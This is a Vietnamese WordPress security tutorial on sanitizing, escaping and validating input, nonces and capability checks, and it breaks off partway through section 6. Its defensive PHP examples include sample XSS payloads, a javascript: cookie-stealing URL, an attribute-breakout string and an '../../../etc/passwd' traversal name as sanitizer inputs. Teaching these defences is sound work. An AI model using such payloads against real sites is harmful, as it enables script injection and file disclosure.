# Bảo mật WordPress

Hướng dẫn toàn diện về bảo mật WordPress: sanitization, escaping, validation, nonces, capability checks, phòng chống SQL injection, XSS, CSRF, bảo mật file upload, cấu hình bảo mật, và các best practices.

---

## Mục lục

1. [Tổng quan bảo mật WordPress](#1-tong-quan-bao-mat-wordpress)
2. [Sanitization - Làm sạch dữ liệu đầu vào](#2-sanitization---lam-sach-du-lieu-dau-vao)
3. [Escaping - Mã hóa dữ liệu đầu ra](#3-escaping---ma-hoa-du-lieu-dau-ra)
4. [Validation - Kiểm tra dữ liệu đầu vào](#4-validation---kiem-tra-du-lieu-dau-vao)
5. [Nonces - Chống giả mạo request](#5-nonces---chong-gia-mao-request)
6. [Capability Checks - Kiểm tra quyền](#6-capability-checks---kiem-tra-quyen)
7. [SQL Injection Prevention](#7-sql-injection-prevention)
8. [XSS Prevention](#8-xss-prevention)
9. [CSRF Prevention](#9-csrf-prevention)
10. [File Upload Security](#10-file-upload-security)
11. [WordPress Security Constants](#11-wordpress-security-constants)
12. [.htaccess Security Rules](#12-htaccess-security-rules)
13. [Hardening wp-config.php](#13-hardening-wp-configphp)
14. [Plugin/Theme Security Checklist](#14-plugintheme-security-checklist)
15. [Ví dụ code bảo mật đúng cách vs sai cách](#15-vi-du-code-bao-mat-dung-cach-vs-sai-cach)

---

## 1. Tổng quan bảo mật WordPress

### 1.1. Nguyên tắc bảo mật cơ bản

WordPress security dựa trên 4 nguyên tắc chính:

1. **Không tin tưởng bất kỳ dữ liệu nào từ người dùng** (Never Trust User Input): Tất cả dữ liệu từ $_GET, $_POST, $_REQUEST, $_COOKIE, HTTP headers, database, API đều phải được validate, sanitize và escape.

2. **Nguyên tắc đặc quyền tối thiểu** (Principle of Least Privilege): Chỉ cấp quyền tối thiểu cần thiết cho người dùng/process.

3. **Bảo vệ theo chiều sâu** (Defense in Depth): Áp dụng nhiều lớp bảo mật, không chỉ dựa vào 1 biện pháp duy nhất.

4. **Secure by Default**: Mặc định phải an toàn, chỉ mở rộng khi cần thiết.

### 1.2. Các loại tấn công phổ biến

| Loại tấn công | Mô tả | Biện pháp phòng chống |
|---------------|-------|----------------------|
| SQL Injection | Chèn SQL độc hại vào query | $wpdb->prepare() |
| XSS (Cross-Site Scripting) | Chèn JavaScript độc hại | Escaping (esc_html, esc_attr, ...) |
| CSRF (Cross-Site Request Forgery) | Giả mạo request từ người dùng | Nonces |
| File Upload Attack | Upload file độc hại | Validate file type, size, content |
| Privilege Escalation | Leo thang quyền | Capability checks |
| Path Traversal | Truy cập file ngoài thư mục cho phép | Validate và sanitize đường dẫn |
| Object Injection | Unserialize dữ liệu độc hại | Validate trước khi unserialize |
| Brute Force | Thử mật khẩu liên tục | Rate limiting, 2FA |

### 1.3. Quy trình xử lý dữ liệu an toàn

```
Input (người dùng) --> Validate --> Sanitize --> Xử lý (lưu DB, tính toán) --> Escape --> Output (HTML)
```

- **Validate**: Kiểm tra dữ liệu có hợp lệ không (trả về true/false).
- **Sanitize**: Làm sạch dữ liệu, loại bỏ phần độc hại (trả về dữ liệu đã làm sạch).
- **Escape**: Mã hóa dữ liệu trước khi hiển thị để ngăn XSS (trả về dữ liệu an toàn cho output).

---

## 2. Sanitization - Làm sạch dữ liệu đầu vào

Sanitization là quá trình làm sạch dữ liệu từ người dùng trước khi lưu vào database hoặc sử dụng trong hệ thống.

### 2.1. sanitize_text_field()

Làm sạch text thuần (plain text). Loại bỏ tags, line breaks dư thừa, octets.

```php
<?php
// Làm sạch tên, tiêu đề, các trường text ngắn
$name = sanitize_text_field( $_POST['name'] );
// Input:  "<script>alert('xss')</script>Nguyen Van A"
// Output: "Nguyen Van A"

// Input:  "  Nguyen   Van   A  "
// Output: "Nguyen Van A"

// Input:  "Nguyen\nVan\nA"
// Output: "Nguyen Van A"

// Ví dụ sử dụng trong form
if ( isset( $_POST['product_name'] ) ) {
    $product_name = sanitize_text_field( wp_unslash( $_POST['product_name'] ) );
    update_post_meta( $post_id, '_product_name', $product_name );
}
```

### 2.2. sanitize_textarea_field()

Tương tự `sanitize_text_field()` nhưng giữ lại line breaks.

```php
<?php
$description = sanitize_textarea_field( $_POST['description'] );
// Input:  "<b>Mô tả</b>\nDòng 2\nDòng 3"
// Output: "Mô tả\nDòng 2\nDòng 3"

// Phù hợp cho: textarea, mô tả, ghi chú
```

### 2.3. sanitize_email()

Làm sạch và validate email.

```php
<?php
$email = sanitize_email( $_POST['email'] );
// Input:  "user @example.com"
// Output: "user@example.com"

// Input:  "invalid-email"
// Output: "" (chuỗi rỗng)

// Input:  "<script>hack</script>user@test.com"
// Output: "scripthackscriptuser@test.com" (loại bỏ ký tự không hợp lệ)

// Luôn kiểm tra kết quả
$email = sanitize_email( $_POST['email'] );
if ( empty( $email ) || ! is_email( $email ) ) {
    wp_die( 'Email không hợp lệ.' );
}
```

### 2.4. sanitize_url() (trước WP 5.9: esc_url_raw())

Làm sạch URL để lưu vào database.

```php
<?php
$url = sanitize_url( $_POST['website'] );
// Input:  "javascript:alert(1)"
// Output: ""

// Input:  "https://example.com/<script>"
// Output: "https://example.com/script"

// Input:  "example.com"
// Output: "http://example.com"  (thêm protocol)

// Phân biệt:
// sanitize_url() / esc_url_raw() : Làm sạch URL để lưu vào database
// esc_url()                      : Làm sạch URL để hiển thị trong HTML
```

### 2.5. wp_kses()

Lọc HTML, chỉ giữ lại các tags và attributes cho phép.

```php
<?php
// Chỉ cho phép các tags cơ bản
$allowed_tags = array(
    'p'      => array(),
    'br'     => array(),
    'strong' => array(),
    'em'     => array(),
    'a'      => array(
        'href'   => array(),
        'title'  => array(),
        'target' => array(),
        'rel'    => array(),
    ),
    'ul'     => array(),
    'ol'     => array(),
    'li'     => array(),
    'img'    => array(
        'src'    => array(),
        'alt'    => array(),
        'width'  => array(),
        'height' => array(),
        'class'  => array(),
    ),
);

$clean_html = wp_kses( $_POST['content'], $allowed_tags );

// Input:  '<p>Text</p><script>alert("xss")</script><a href="http://test.com" onclick="hack()">Link</a>'
// Output: '<p>Text</p>alert("xss")<a href="http://test.com">Link</a>'
// (script tag bị loại, onclick bị loại)

// Sử dụng wp_kses_post() - cho phép các tags mà post content cho phép
$content = wp_kses_post( $_POST['content'] );

// Sử dụng wp_kses_data() - chỉ cho phép entities
$data = wp_kses_data( $_POST['data'] );
```

### 2.6. Các hàm sanitize khác

```php
<?php
// sanitize_title() - Tạo slug từ chuỗi
$slug = sanitize_title( 'Bài Viết Mới! @#$' );
// Output: "bai-viet-moi"

// sanitize_file_name() - Làm sạch tên file
$filename = sanitize_file_name( '../../../etc/passwd' );
// Output: "etc-passwd"

$filename = sanitize_file_name( 'hình ảnh <script>.jpg' );
// Output: "hinh-anh-script.jpg"

// sanitize_html_class() - Làm sạch CSS class name
$class = sanitize_html_class( 'my class <script>' );
// Output: "myclassscript"

// sanitize_key() - Làm sạch key (chữ thường, alphanumeric, dashes, underscores)
$key = sanitize_key( 'My_Custom-Key 123!' );
// Output: "my_custom-key123"

// sanitize_mime_type() - Làm sạch MIME type
$mime = sanitize_mime_type( 'image/jpeg; charset=utf-8' );
// Output: "image/jpeg"

// sanitize_option() - Sanitize option theo tên
$value = sanitize_option( 'blogname', $_POST['site_name'] );

// sanitize_hex_color() - Validate mã màu hex
$color = sanitize_hex_color( '#ff0000' );  // "#ff0000"
$color = sanitize_hex_color( 'red' );      // null (không hợp lệ)

// absint() - Chuyển thành số nguyên dương
$id = absint( $_GET['id'] );  // "-5" -> 5, "abc" -> 0

// intval() - Chuyển thành integer
$page = intval( $_GET['page'] );

// floatval() - Chuyển thành float
$price = floatval( $_POST['price'] );

// wp_unslash() - Loại bỏ slashes mà WordPress tự thêm vào $_POST/$_GET
$data = sanitize_text_field( wp_unslash( $_POST['data'] ) );
```

### 2.7. Sanitize arrays và dữ liệu phức tạp

```php
<?php
// Sanitize mảng
function sanitize_array( $input ) {
    if ( is_array( $input ) ) {
        return array_map( 'sanitize_array', $input );
    }
    return sanitize_text_field( $input );
}

$clean_data = sanitize_array( $_POST['data'] );

// Sanitize dữ liệu có cấu trúc
function sanitize_settings( $input ) {
    $sanitized = array();

    if ( isset( $input['title'] ) ) {
        $sanitized['title'] = sanitize_text_field( $input['title'] );
    }

    if ( isset( $input['email'] ) ) {
        $sanitized['email'] = sanitize_email( $input['email'] );
    }

    if ( isset( $input['url'] ) ) {
        $sanitized['url'] = sanitize_url( $input['url'] );
    }

    if ( isset( $input['content'] ) ) {
        $sanitized['content'] = wp_kses_post( $input['content'] );
    }

    if ( isset( $input['count'] ) ) {
        $sanitized['count'] = absint( $input['count'] );
    }

    if ( isset( $input['enabled'] ) ) {
        $sanitized['enabled'] = (bool) $input['enabled'];
    }

    // Whitelist cho giá trị cố định
    if ( isset( $input['color'] ) ) {
        $allowed_colors = array( 'red', 'blue', 'green' );
        $sanitized['color'] = in_array( $input['color'], $allowed_colors, true )
            ? $input['color']
            : 'blue'; // giá trị mặc định
    }

    return $sanitized;
}
```

---

## 3. Escaping - Mã hóa dữ liệu đầu ra

Escaping là quá trình mã hóa dữ liệu trước khi hiển thị trong HTML/JavaScript để ngăn XSS. Luôn escape TẠI THỜI ĐIỂM OUTPUT, không escape trước khi lưu.

### 3.1. esc_html()

Mã hóa các ký tự HTML đặc biệt. Dùng khi hiển thị text trong HTML.

```php
<?php
// Escape text trong HTML
echo '<p>' . esc_html( $user_input ) . '</p>';

// Input:  '<script>alert("xss")</script>'
// Output trong HTML: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
// Hiển thị trên trình duyệt: '<script>alert("xss")</script>' (như text, không chạy)

// esc_html__() - Escape + dịch chuỗi
echo '<h1>' . esc_html__( 'Xin chào', 'my-plugin' ) . '</h1>';

// esc_html_e() - Escape + dịch + echo
echo '<h1>';
esc_html_e( 'Xin chào', 'my-plugin' );
echo '</h1>';

// Ví dụ thực tế
$title = get_the_title();
echo '<h2>' . esc_html( $title ) . '</h2>';

$username = get_the_author_meta( 'display_name' );
echo '<span class="author">' . esc_html( $username ) . '</span>';
```

### 3.2. esc_attr()

Mã hóa dữ liệu để đặt trong HTML attribute. Tương tự esc_html() nhưng chuyển đổi thêm các ký tự single quote, double quote.

```php
<?php
// Escape giá trị attribute
$value = '" onmouseover="alert(1)" data-x="';
echo '<input type="text" value="' . esc_attr( $value ) . '">';
// Output: <input type="text" value="&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;">

// Escape class name
$class = get_post_meta( $post_id, '_custom_class', true );
echo '<div class="' . esc_attr( $class ) . '">';

// Escape title attribute
$tooltip = get_post_meta( $post_id, '_tooltip', true );
echo '<span title="' . esc_attr( $tooltip ) . '">';

// esc_attr__() và esc_attr_e() - Với i18n
echo '<input type="submit" value="' . esc_attr__( 'Gửi', 'my-plugin' ) . '">';

// Ví dụ form
$name  = isset( $_POST['name'] ) ? $_POST['name'] : '';
$email = isset( $_POST['email'] ) ? $_POST['email'] : '';
?>
<form method="post">
    <input type="text" name="name" value="<?php echo esc_attr( $name ); ?>">
    <input type="email" name="email" value="<?php echo esc_attr( $email ); ?>">
    <textarea name="bio"><?php echo esc_textarea( $bio ); ?></textarea>
    <button type="submit"><?php esc_html_e( 'Lưu', 'my-plugin' ); ?></button>
</form>
```

### 3.3. esc_url()

Làm sạch URL để hiển thị an toàn trong HTML.

```php
<?php
// Escape URL cho href, src, action
$url = 'javascript:alert(document.cookie)';
echo '<a href="' . esc_url( $url ) . '">Link</a>';
// Output: <a href="">Link</a>  (javascript: bị loại bỏ)

$url = 'https://example.com/page?param=<script>';
echo '<a href="' . esc_url( $url ) . '">Link</a>';
// URL được làm sạch an toàn

// Cho phép chỉ các protocols cụ thể
echo esc_url( $url, array( 'https' ) );  // Chỉ chấp nhận https://

// Escape URL trong các ngữ cảnh khác nhau:

// Trong href:
echo '<a href="' . esc_url( $url ) . '">Click</a>';

// Trong src:
echo '<img src="' . esc_url( $image_url ) . '" alt="">';

// Trong form action:
echo '<form action="' . esc_url( admin_url( 'admin-post.php' ) ) . '">';

// Trong redirect:
wp_redirect( esc_url_raw( $redirect_url ) );
// Chú ý: Dùng esc_url_raw() (không encode &) khi URL không nằm trong HTML

// Phân biệt esc_url() và esc_url_raw():
// esc_url()     : & -> &amp;  (cho HTML output)
// esc_url_raw() : & -> &      (cho database, redirect, HTTP headers)
```

### 3.4. esc_js()

Mã hóa chuỗi để sử dụng an toàn trong JavaScript inline.

```php
<?php
// Escape chuỗi trong JavaScript inline
$message = get_option( 'welcome_message' );
?>
<script>
    var message = '<?php echo esc_js( $message ); ?>';
    alert(message);
</script>

<?php
// Ví dụ với event handler
$confirm_text = "Bạn có chắc muốn xóa? Hãy nhấn 'OK'";
?>
<button onclick="return confirm('<?php echo esc_js( $confirm_text ); ?>')">
    Xóa
</button>

<?php
// TỐT HƠN: Sử dụng wp_localize_script() hoặc data attributes
// thay vì inline JavaScript
wp_localize_script( 'my-script', 'myData', array(
    'message' => $message,  // WordPress tự escape
    'ajaxUrl' => admin_url( 'admin-ajax.php' ),
    'nonce'   => wp_create_nonce( 'my_nonce' ),
) );

// Hoặc sử dụng wp_add_inline_script()
wp_add_inline_script( 'my-script', sprintf(
    'var myConfig = %s;',
    wp_json_encode( array(
        'message' => $message,
        'apiUrl'  => rest_url( 'myplugin/v1/' ),
    ) )
) );
```

### 3.5. wp_kses_post()

Lọc HTML chỉ giữ lại các tags/attributes cho phép trong post content.

```php
<?php
// Cho phép HTML như post content (p, br, strong, em, a, img, ul, ol, h1-h6, ...)
echo wp_kses_post( $content );

// Tương đương với:
echo wp_kses( $content, 'post' );

// Tags được phép bởi wp_kses_post():
// a, abbr, acronym, address, b, big, blockquote, br, cite, code, del, dd, dl, dt,
// em, figure, figcaption, h1-h6, hr, i, img, ins, kbd, li, mark, ol, p, pre, q,
// s, small, span, strike, strong, sub, sup, table, tbody, td, tfoot, th, thead,
// tr, tt, u, ul, var

// Ví dụ: Hiển thị excerpt có HTML
$excerpt = get_post_meta( $post_id, '_custom_excerpt', true );
echo '<div class="excerpt">' . wp_kses_post( $excerpt ) . '</div>';
```

### 3.6. esc_textarea()

Escape nội dung trong thẻ textarea.

```php
<?php
$content = get_post_meta( $post_id, '_bio', true );
?>
<textarea name="bio"><?php echo esc_textarea( $content ); ?></textarea>

<?php
// esc_textarea() escape: &, <, >, ", '
// Tương tự htmlspecialchars() nhưng đảm bảo tương thích WordPress
```

### 3.7. wp_json_encode()

Mã hóa dữ liệu thành JSON an toàn.

```php
<?php
// Hiển thị dữ liệu trong JavaScript
$data = array(
    'name'    => 'Nguyen Van <script>hack</script>',
    'message' => "It's a \"test\"",
);
?>
<script>
    var data = <?php echo wp_json_encode( $data ); ?>;
    // Output an toàn: {"name":"Nguyen Van <script>hack<\/script>","message":"It's a \"test\""}
</script>
```

### 3.8. Bảng tóm tắt escape theo ngữ cảnh

| Ngữ cảnh | Hàm sử dụng | Ví dụ |
|----------|-------------|-------|
| HTML body | `esc_html()` | `<p><?php echo esc_html($var); ?></p>` |
| HTML attribute | `esc_attr()` | `<input value="<?php echo esc_attr($var); ?>">` |
| URL (href, src) | `esc_url()` | `<a href="<?php echo esc_url($var); ?>">` |
| JavaScript inline | `esc_js()` | `onclick="alert('<?php echo esc_js($var); ?>')"` |
| Textarea | `esc_textarea()` | `<textarea><?php echo esc_textarea($var); ?></textarea>` |
| HTML content | `wp_kses_post()` | `<div><?php echo wp_kses_post($content); ?></div>` |
| CSS inline | `safecss_filter_attr()` | Lọc CSS attributes an toàn |
| JSON | `wp_json_encode()` | `var data = <?php echo wp_json_encode($arr); ?>;` |

---

## 4. Validation - Kiểm tra dữ liệu đầu vào

Validation kiểm tra xem dữ liệu có hợp lệ hay không TRƯỚC khi xử lý.

### 4.1. Validation functions của WordPress

```php
<?php
// Kiểm tra email
if ( ! is_email( $email ) ) {
    wp_die( 'Email không hợp lệ.' );
}

// Kiểm tra URL
if ( ! wp_http_validate_url( $url ) ) {
    wp_die( 'URL không hợp lệ.' );
}

// Kiểm tra IP
if ( ! rest_is_ip_address( $ip ) ) {
    wp_die( 'Địa chỉ IP không hợp lệ.' );
}

// Kiểm tra số
if ( ! is_numeric( $value ) ) {
    wp_die( 'Giá trị phải là số.' );
}

// Kiểm tra boolean
$value = rest_sanitize_boolean( $input );  // 'true', '1', 'yes' -> true

// Kiểm tra JSON
$data = json_decode( $input, true );
if ( json_last_error() !== JSON_ERROR_NONE ) {
    wp_die( 'Dữ liệu JSON không hợp lệ.' );
}
```

### 4.2. Validation tự định nghĩa

```php
<?php
/**
 * Validate dữ liệu form đăng ký
 */
function validate_registration_data( $data ) {
    $errors = new WP_Error();

    // Validate tên
    if ( empty( $data['name'] ) ) {
        $errors->add( 'name_required', 'Vui lòng nhập họ tên.' );
    } elseif ( mb_strlen( $data['name'] ) < 2 || mb_strlen( $data['name'] ) > 100 ) {
        $errors->add( 'name_length', 'Họ tên phải từ 2 đến 100 ký tự.' );
    }

    // Validate email
    if ( empty( $data['email'] ) ) {
        $errors->add( 'email_required', 'Vui lòng nhập email.' );
    } elseif ( ! is_email( $data['email'] ) ) {
        $errors->add( 'email_invalid', 'Địa chỉ email không hợp lệ.' );
    } elseif ( email_exists( $data['email'] ) ) {
        $errors->add( 'email_exists', 'Email này đã được sử dụng.' );
    }

    // Validate mật khẩu
    if ( empty( $data['password'] ) ) {
        $errors->add( 'password_required', 'Vui lòng nhập mật khẩu.' );
    } elseif ( strlen( $data['password'] ) < 8 ) {
        $errors->add( 'password_short', 'Mật khẩu phải có ít nhất 8 ký tự.' );
    } elseif ( ! preg_match( '/[A-Z]/', $data['password'] ) ) {
        $errors->add( 'password_uppercase', 'Mật khẩu phải có ít nhất 1 chữ in hoa.' );
    } elseif ( ! preg_match( '/[0-9]/', $data['password'] ) ) {
        $errors->add( 'password_number', 'Mật khẩu phải có ít nhất 1 số.' );
    }

    // Validate số điện thoại
    if ( ! empty( $data['phone'] ) ) {
        if ( ! preg_match( '/^(\+84|0)[0-9]{9,10}$/', $data['phone'] ) ) {
            $errors->add( 'phone_invalid', 'Số điện thoại không hợp lệ.' );
        }
    }

    // Validate tuổi
    if ( ! empty( $data['age'] ) ) {
        $age = intval( $data['age'] );
        if ( $age < 13 || $age > 120 ) {
            $errors->add( 'age_invalid', 'Tuổi phải từ 13 đến 120.' );
        }
    }

    // Validate whitelist
    if ( ! empty( $data['role'] ) ) {
        $allowed_roles = array( 'subscriber', 'contributor', 'author' );
        if ( ! in_array( $data['role'], $allowed_roles, true ) ) {
            $errors->add( 'role_invalid', 'Vai trò không hợp lệ.' );
        }
    }

    return $errors;
}

// Sử dụng
$errors = validate_registration_data( $_POST );
if ( $errors->has_errors() ) {
    foreach ( $errors->get_error_messages() as $message ) {
        echo '<p class="error">' . esc_html( $message ) . '</p>';
    }
    return;
}
// Tiếp tục xử lý đăng ký...
```

### 4.3. Validation pattern

```php
<?php
// Whitelist validation (TỐT NHẤT) - Chỉ chấp nhận giá trị trong danh sách cho phép
function validate_sort_order( $value ) {
    $allowed = array( 'asc', 'desc' );
    return in_array( strtolower( $value ), $allowed, true ) ? strtolower( $value ) : 'asc';
}

// Range validation - Kiểm tra trong khoảng
function validate_per_page( $value ) {
    $value = absint( $value );
    return max( 1, min( 100, $value ) );  // Giới hạn 1-100
}

// Pattern validation - Kiểm tra theo mẫu
function validate_slug( $value ) {
    if ( ! preg_match( '/^[a-z0-9\-]+$/', $value ) ) {
        return new WP_Error( 'invalid_slug', 'Slug chỉ được chứa chữ thường, số và dấu gạch ngang.' );
    }
    return $value;
}

// Type validation - Kiểm tra kiểu dữ liệu
function validate_post_id( $value ) {
    $value = absint( $value );
    if ( $value <= 0 ) {
        return new WP_Error( 'invalid_id', 'ID phải là số nguyên dương.' );
    }
    $post = get_post( $value );
    if ( ! $post ) {
        return new WP_Error( 'post_not_found', 'Bài viết không tồn tại.' );
    }
    return $value;
}
```

---

## 5. Nonces - Chống giả mạo request

Nonce (Number Used Once) trong WordPress là token bảo mật để bảo vệ chống CSRF. Mặc dù gọi là "once", WordPress nonce có hiệu lực 24 giờ (2 tick, mỗi tick 12 giờ).

### 5.1. wp_nonce_field()

Tạo hidden input chứa nonce trong form.

```php
<?php
// Tạo form với nonce
function my_settings_form() {
    ?>
    <form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
        <?php wp_nonce_field( 'my_save_settings', 'my_settings_nonce' ); ?>
        <input type="hidden" name="action" value="my_save_settings">

        <label>Tiêu đề:
            <input type="text" name="title"
                   value="<?php echo esc_attr( get_option( 'my_title', '' ) ); ?>">
        </label>

        <label>Mô tả:
            <textarea name="description"><?php echo esc_textarea( get_option( 'my_description', '' ) ); ?></textarea>
        </label>

        <?php submit_button( 'Lưu cài đặt' ); ?>
    </form>
    <?php
}
// wp_nonce_field() tạo ra:
// <input type="hidden" name="my_settings_nonce" value="abc123def456">
// <input type="hidden" name="_wp_http_referer" value="/wp-admin/...">
```

### 5.2. wp_verify_nonce()

Xác thực nonce từ request.

```php
<?php
// Xử lý form submission
add_action( 'admin_post_my_save_settings', 'my_handle_save_settings' );

function my_handle_save_settings() {
    // Bước 1: Kiểm tra nonce
    if ( ! isset( $_POST['my_settings_nonce'] )
         || ! wp_verify_nonce( $_POST['my_settings_nonce'], 'my_save_settings' ) ) {
        wp_die( 'Xác thực bảo mật thất bại. Vui lòng thử lại.' );
    }

    // Bước 2: Kiểm tra quyền
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Bạn không có quyền thực hiện thao tác này.' );
    }

    // Bước 3: Sanitize và lưu dữ liệu
    if ( isset( $_POST['title'] ) ) {
        update_option( 'my_title', sanitize_text_field( wp_unslash( $_POST['title'] ) ) );
    }

    if ( isset( $_POST['description'] ) ) {
        update_option( 'my_description', sanitize_textarea_field( wp_unslash( $_POST['description'] ) ) );
    }

    // Bước 4: Redirect về trang settings
    wp_safe_redirect( add_query_arg( 'updated', 'true', wp_get_referer() ) );
    exit;
}

// Giá trị trả về của wp_verify_nonce():
// false : Nonce không hợp lệ
// 1     : Nonce được tạo trong 0-12 giờ trước (tick 1)
// 2     : Nonce được tạo trong 12-24 giờ trước (tick 2)
```

### 5.3. wp_create_nonce()

Tạo nonce string (không phải form field).

```php
<?php
// Tạo nonce cho URL
$delete_url = add_query_arg( array(
    'action' => 'delete_item',
    'id'     => $item_id,
    'nonce'  => wp_create_nonce( 'delete_item_' . $item_id ),
), admin_url( 'admin.php' ) );

echo '<a href="' . esc_url( $delete_url ) . '">Xóa</a>';

// Xác thực
if ( isset( $_GET['action'] ) && 'delete_item' === $_GET['action'] ) {
    $item_id = absint( $_GET['id'] );

    if ( ! wp_verify_nonce( $_GET['nonce'], 'delete_item_' . $item_id ) ) {
        wp_die( 'Nonce không hợp lệ.' );
    }

    // Xử lý xóa...
}

// Tạo nonce cho AJAX
wp_localize_script( 'my-script', 'myAjax', array(
    'url'   => admin_url( 'admin-ajax.php' ),
    'nonce' => wp_create_nonce( 'my_ajax_nonce' ),
) );
```

### 5.4. check_admin_referer()

Kiểm tra nonce và referer trong trang admin. Là shortcut kết hợp wp_verify_nonce và kiểm tra referer.

```php
<?php
// Trong form xử lý
function my_process_admin_form() {
    // Kiểm tra nonce với tên trường mặc định '_wpnonce'
    check_admin_referer( 'my_action_name' );
    // Nếu thất bại, tự động wp_die()

    // Hoặc chỉ định tên trường nonce
    check_admin_referer( 'my_action_name', 'my_nonce_field' );

    // Xử lý dữ liệu...
}

// Cho AJAX requests
function my_ajax_handler() {
    check_ajax_referer( 'my_ajax_nonce', 'nonce' );
    // Tương tự check_admin_referer nhưng cho AJAX
    // Kiểm tra nonce từ $_POST['nonce'] hoặc $_GET['nonce']
    // hoặc từ header X-WP-Nonce

    // Xử lý...
    wp_send_json_success( array( 'message' => 'Thành công' ) );
}
add_action( 'wp_ajax_my_action', 'my_ajax_handler' );
```

### 5.5. Nonce trong AJAX - Ví dụ đầy đủ

```php
<?php
// PHP: Đăng ký script và truyền nonce
add_action( 'wp_enqueue_scripts', 'my_enqueue_ajax_script' );
function my_enqueue_ajax_script() {
    wp_enqueue_script( 'my-ajax', plugin_dir_url( __FILE__ ) . 'js/ajax.js', array( 'jquery' ), '1.0', true );
    wp_localize_script( 'my-ajax', 'myAjax', array(
        'url'   => admin_url( 'admin-ajax.php' ),
        'nonce' => wp_create_nonce( 'my_ajax_nonce' ),
    ) );
}

// PHP: Xử lý AJAX
add_action( 'wp_ajax_my_vote', 'my_handle_vote' );
add_action( 'wp_ajax_nopriv_my_vote', 'my_handle_vote' );

function my_handle_vote() {
    // Kiểm tra nonce
    if ( ! check_ajax_referer( 'my_ajax_nonce', 'nonce', false ) ) {
        wp_send_json_error( array( 'message' => 'Xác thực thất bại.' ), 403 );
    }

    // Kiểm tra dữ liệu
    $post_id = isset( $_POST['post_id'] ) ? absint( $_POST['post_id'] ) : 0;
    if ( ! $post_id ) {
        wp_send_json_error( array( 'message' => 'ID bài viết không hợp lệ.' ) );
    }

    // Xử lý vote
    $votes = (int) get_post_meta( $post_id, '_vote_count', true );
    update_post_meta( $post_id, '_vote_count', $votes + 1 );

    wp_send_json_success( array(
        'votes'   => $votes + 1,
        'message' => 'Đã vote thành công!',
    ) );
}
```

```javascript
// JavaScript: Gửi AJAX request với nonce
jQuery(document).ready(function($) {
    $('.vote-button').on('click', function(e) {
        e.preventDefault();

        var postId = $(this).data('post-id');
        var button = $(this);

        $.ajax({
            url: myAjax.url,
            method: 'POST',
            data: {
                action: 'my_vote',
                nonce: myAjax.nonce,
                post_id: postId,
            },
            success: function(response) {
                if (response.success) {
                    button.find('.count').text(response.data.votes);
                } else {
                    alert(response.data.message);
                }
            },
            error: function() {
                alert('Có lỗi xảy ra.');
            },
        });
    });
});
```

---

## 6. Capability Checks - Kiểm tra quyền

### 6.1. current_user_can()

Kiểm tra quyền của người dùng hiện tại.

```php
<?php
// Kiểm tra capability tổng quát
if ( current_user_can( 'manage_options' ) ) {
    // Chỉ admin mới vào đây
}

if ( current_user_can( 'edit_posts' ) ) {
    // User có quyền edit posts (Editor, Admin, Author)
}

if ( current_user_can( 'upload_files' ) ) {
    // User có quyền upload files
}

// Kiểm tra capability trên đối tượng cụ thể
$post_id = 42;
if ( current_user_can( 'edit_post', $post_id ) ) {
    // User có quyền edit bài viết này (có thể là tác giả hoặc editor)
}

if ( current_user_can( 'delete_post', $post_id ) ) {
    // User có quyền xóa bài viết này
}

if ( current_user_can( 'edit_user', $target_user_id ) ) {
    // User có quyền edit user này
}
```

### 6.2. user_can()

Kiểm tra quyền của một user bất kỳ (không phải user hiện tại).

```php
<?php
$user_id = 5;

if ( user_can( $user_id, 'manage_options' ) ) {
    echo "User {$user_id} là admin.";
}

if ( user_can( $user_id, 'edit_post', $post_id ) ) {
    echo "User {$user_id} có quyền edit bài viết này.";
}

// Kiểm tra role của user
$user = get_userdata( $user_id );
if ( $user && in_array( 'administrator', $user->roles, true ) ) {
    echo "User là administrator.";
}
```

### 6.3. Các capability phổ biến

```php
<?php
// Super Admin (Multisite)
current_user_can( 'manage_network' );

// Administrator
current_user_can( 'manage_options' );       // Quản lý cài đặt
current_user_can( 'activate_plugins' );     // Kích hoạt plugins
current_user_can( 'edit_themes' );          // Sửa theme
current_user_can( 'install_plugins' );      // Cài plugin
current_user_can( 'create_users' );         // Tạo user
current_user_can( 'delete_users' );         // Xóa user
current_user_can( 'unfiltered_html' );      // Đăng HTML không lọc

// Editor
current_user_can( 'edit_others_posts' );    // Sửa bài người khác
current_user_can( 'edit_pages' );           // Sửa pages
current_user_can( 'manage_categories' );    // Quản lý categories
current_user_can( 'moderate_comments' );    // Duyệt comments
current_user_can( 'edit_published_posts' ); // Sửa bài đã publish

// Author
current_user_can( 'publish_posts' );        // Publish bài viết
current_user_can( 'edit_posts' );           // Sửa bài của mình
current_user_can( 'upload_files' );         // Upload files
current_user_can( 'delete_published_posts' ); // Xóa bài đã publish

// Contributor
current_user_can( 'edit_posts' );           // Tạo và sửa bài nháp
current_user_can( 'delete_posts' );         // Xóa bài nháp của mình
// Contributor KHÔNG có: publish_posts, upload_files

// Subscriber
current_user_can( 'read' );                 // Đọc
```

### 6.4. Custom capabilities

```php
<?php
// Thêm custom capability khi activate plugin
register_activation_hook( __FILE__, function() {
    $admin = get_role( 'administrator' );
    if ( $admin ) {
        $admin->add_cap( 'manage_my_plugin' );
        $admin->add_cap( 'edit_my_items' );
        $admin->add_cap( 'delete_my_items' );
    }

    $editor = get_role( 'editor' );
    if ( $editor ) {
        $editor->add_cap( 'edit_my_items' );
    }
} );

// Xóa capability khi deactivate
register_deactivation_hook( __FILE__, function() {
    $roles = array( 'administrator', 'editor' );
    $caps  = array( 'manage_my_plugin', 'edit_my_items', 'delete_my_items' );

    foreach ( $roles as $role_name ) {
        $role = get_role( $role_name );
        if ( $role ) {
            foreach ( $caps as $cap ) {
                $role->remove_cap( $cap );
            }
        }
    }
} );

// Sử dụng custom capability
if ( current_user_can( 'manage_my_plugin' ) ) {
    // Hiển thị trang cài đặt plugin
}

// Đăng ký menu với capability
add_action( 'admin_menu', function() {
    add_menu_page(
        'My Plugin',
        'My Plugin',
        'manage_my_plugin',  // Capability yêu cầu
        'my-plugin',
        'my_plugin_page'
    );
} );
```

### 6.5. Kiểm tra quyền trong meta box save

```php
<?php
add_action( 'save_post', 'my_save_meta_box' );
function my_save_meta_box( $post_id ) {
    // Kiểm tra autosave
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
        return;
    }

    // Kiểm tra nonce
    if ( ! isset( $_POST['my_meta_nonce'] )
         || ! wp_verify_nonce( $_POST['my_meta_nonce'], 'my_save_meta' ) ) {
        return;
    }

